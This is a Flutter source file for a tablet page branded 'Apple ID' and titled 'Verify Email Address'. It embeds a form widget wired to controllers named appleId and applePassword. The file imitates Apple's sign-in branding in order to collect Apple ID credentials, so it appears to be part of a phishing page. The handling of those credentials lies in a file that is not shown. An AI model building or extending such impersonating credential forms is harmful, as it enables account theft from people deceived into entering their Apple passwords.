import 'package:apple/Verify/form_widget_verify.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';

class TabletLayout extends StatefulWidget {
  final String username;
  final dynamic password;
  const TabletLayout({
    super.key,
    required this.username,
    required this.password,
  });

  @override
  State<TabletLayout> createState() => _TabletLayoutState();
}

class _TabletLayoutState extends State<TabletLayout> {
  @override
  Widget build(BuildContext context) {
    TextEditingController passwordC = TextEditingController();
    TextEditingController emailC = TextEditingController();
    return Scaffold(
        resizeToAvoidBottomInset: false,
        backgroundColor: CupertinoColors.white,
        appBar: navBar(),
        body: Center(
          child: SizedBox(
              child: Padding(
                  padding: const EdgeInsets.only(
                    left: 20.0,
                    right: 20,
                  ),
                  child: ListView(children: [
                    Container(
                      width: MediaQuery.of(context).size.width,
                      height: 150,
                      decoration: const BoxDecoration(
                          gradient: LinearGradient(colors: [
                        Colors.red,
                        Colors.grey,
                        Colors.blue,
                        Colors.grey,
                        Colors.amber,
                        Colors.red
                      ])),
                      child: const Center(
                          child: Text(
                        'Verify Email Address',
                        style: TextStyle(color: Colors.white, fontSize: 30),
                      )),
                    ),
                    Row(
                      children: [
                        Expanded(flex: 1, child: SizedBox()),
                        Expanded(
                          flex: 3,
                          child: SizedBox(
                            child: VerifyFormWidget(
                              appleId: emailC,
                              applePassword: passwordC,
                            ),
                          ),
                        ),
                        Expanded(flex: 1, child: SizedBox()),
                      ],
                    ),
                  ]))),
        ));
  }

  navBar() {
    return AppBar(
        backgroundColor: CupertinoColors.white,
        leading: const Padding(
          padding: EdgeInsets.only(top: 20, left: 20),
          child: Text(
            'Apple ID',
            style: TextStyle(
                fontSize: 17, color: Colors.black, fontWeight: FontWeight.bold),
          ),
        ),
        leadingWidth: 150,
        actions: [
          Padding(
              padding: const EdgeInsets.only(right: 20.0),
              child: Row(
                children: [
                  TextButton(
                      onPressed: () {},
                      child: const Text(
                        'Sign in',
                        style: TextStyle(color: Colors.black, fontSize: 15),
                      )),
                  TextButton(
                      onPressed: () {},
                      child: TextButton(
                          onPressed: () {},
                          child: const Text('Create An Apple ID',
                              style: TextStyle(
                                  color: Colors.black, fontSize: 15)))),
                  TextButton(
                      onPressed: () {},
                      child: const Text('FAQ',
                          style: TextStyle(color: Colors.black, fontSize: 15)))
                ],
              )),
        ],
        elevation: 1);
  }
}
